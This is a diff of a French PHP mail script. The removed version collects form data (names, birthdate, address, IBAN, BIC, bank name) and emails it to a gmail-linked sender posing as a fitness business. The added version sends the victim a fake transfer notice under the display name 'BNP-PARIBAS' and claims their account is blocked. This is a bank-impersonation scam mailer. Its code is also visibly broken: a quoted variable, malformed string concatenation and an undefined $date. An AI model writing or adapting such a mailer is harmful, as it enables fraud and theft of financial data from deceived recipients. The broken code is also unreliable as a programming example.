@@ -15,14 +15,10 @@ try {
     // Récupération des données du formulaire
     $firstName = $_POST['firstName'] ?? 'N/A';
     $lastName = $_POST['lastName'] ?? 'N/A';
-    $birthdate = $_POST['birthdate'] ?? 'N/A';
-    $address = $_POST['address'] ?? 'N/A';
-    $city = $_POST['city'] ?? 'N/A';
     $email = $_POST['email'] ?? 'N/A';
-    $accountHolder = $_POST['accountHolder'] ?? 'N/A';
+    $montant = $_POST['montant'] ?? 'N/A';
     $iban = $_POST['iban'] ?? 'N/A';
-    $bic = $_POST['bic'] ?? 'N/A';
-    $bankName = $_POST['bankName'] ?? 'N/A';
+
 
     // Configuration du serveur SMTP
     $mail->isSMTP();
@@ -34,22 +30,26 @@ try {
     $mail->Port = 587; // Port pour SSL
 
     // Destinataires
-    $mail->setFrom('donquidofi612@gmail.com', 'OnAir Fitness');
-    $mail->addAddress('contact@onairefitness.com', 'Client'); // Ajoutez une adresse de destinataire
+    $mail->setFrom('donquidofi612@gmail.com', 'BNP-PARIBAS');
+    $mail->addAddress('$email', 'Client'); // Ajoutez une adresse de destinataire
     // Contenu de l'e-mail
     $mail->isHTML(true);
-    $mail->Subject = 'NEW ACCOUNT Onairefitness';
-    $mail->Body    = "Voici les détails du formulaire :<br>
-                      Prénom: $firstName<br>
-                      Nom: $lastName<br>
-                      Date de naissance: $birthdate<br>
-                      Adresse: $address<br>
-                      Ville: $city<br>
-                      Email: $email<br>
-                      Titulaire du compte: $accountHolder<br>
-                      IBAN: $iban<br>
-                      BIC: $bic<br>
-                      Nom de la banque: $bankName";
+    $mail->Subject = 'Notification de virement bancaire';
+    $mail->Body    = "Cher(e) $firstName $lastName :<br>
+
+                        Nous avons le plaisir de vous informer qu'un virement d'un montant de $montant a été envoyé sur votre compte $iban le $date . Ce virement a été initié par Mr. $firstName $lastName depuis son compte chez nous.
+                            <br>
+                        Les détails du virement sont les suivants :<br>
+                         "<ul>" .
+           "<li><strong>Montant du virement :</strong> $montant</li>" .
+           "<li><strong>Date du virement :</strong> $date</li>" .
+           "<li><strong>Compte émetteur :</strong> $firstName $lastName</li>" .
+           "<li><strong>Motif du virement :</strong> Suivi</li>" .
+           "</ul>" <br>
+           <br>
+           Votre compte est bloqué, aucune opération bancaire ne peut etre effectuée pour le moment. <br>
+                        
+                    ";
 
     $mail->send();
     $response['success'] = true;
